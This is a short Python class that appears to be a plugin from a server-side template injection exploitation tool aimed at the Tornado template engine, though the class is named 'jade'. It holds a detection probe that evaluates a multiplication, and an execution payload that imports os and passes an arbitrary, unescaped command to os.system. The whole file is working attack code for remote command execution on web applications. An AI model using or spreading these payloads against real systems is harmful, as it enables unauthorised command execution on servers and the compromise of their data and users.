class jade:
    def __init__(self):
        self.name = "tornado"
        self.exec = True
        self.download = False
        self.upload = False

    def payload_test(self):
        return ["{{ 347*21 }}"]

    def execu(self,cmd,index=-1):
        payload = [
        '{% import os %}{{os.system("'+cmd+'")}}'
        ]
        if index >= 0:
            return payload[index]
        return payload

